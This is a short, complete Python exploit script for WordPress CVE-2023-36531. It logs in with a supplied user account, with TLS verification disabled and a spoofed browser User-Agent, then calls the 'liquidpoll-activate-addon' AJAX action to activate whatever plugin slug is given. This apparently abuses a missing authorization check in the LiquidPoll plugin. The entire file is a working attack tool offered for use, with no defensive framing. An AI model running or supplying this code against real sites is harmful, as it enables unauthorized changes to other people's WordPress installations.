import requests
import argparse
import urllib3


# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()

# Setting User-Agent for all requests.
user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
session.headers.update({'User-Agent': user_agent})

def login_to_wordpress(url, username, password):
    # Create a session
    

    # Prepare login data
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1',
        'redirect_to': url + '/wp-admin/'
    }

    # Send a POST request to the login page
    response = session.post(url + '/wp-login.php', data=login_data, verify=False)

    # Check if login was successful
    if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
        print('Logged in successfully.')
        return session
    else:
        print('Failed to log in.')
        return None

def send_post_request(session, url, action, addon_id):
    # Prepare the POST data
    post_data = {
        'action': action,
        'addon_id': addon_id
    }

    # Send the POST request
    response = session.post(url + '/wp-admin/admin-ajax.php', data=post_data, verify=False)

    # Check the response
    if response.status_code == 200:
        print('POST request sent successfully.')
        if "Plugin file does not exist" in response.text:
           print("Plugin not found on server")
        if '"success":true' in response.text:
           print ("Plugin Activated.")
    else:
        print('Failed to send POST request.')

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='WordPress CVE-2023-36531 Exploit')
    parser.add_argument("-w", "--url", required=True, help="URL of the WordPress site")
    parser.add_argument("-u", "--username", required=True, help="Username of your wordpress user")
    parser.add_argument("-p", "--password", required=True, help="Password of your wordpress password")
    parser.add_argument("-a", "--addon", required=True, help='Plugin Slug')
    args = parser.parse_args()

    # Log in to WordPress
    session = login_to_wordpress(args.url, args.username, args.password)
    if session is None:
        return

    # Send the POST request
    send_post_request(session, args.url, 'liquidpoll-activate-addon', args.addon)

if __name__ == '__main__':
    main()
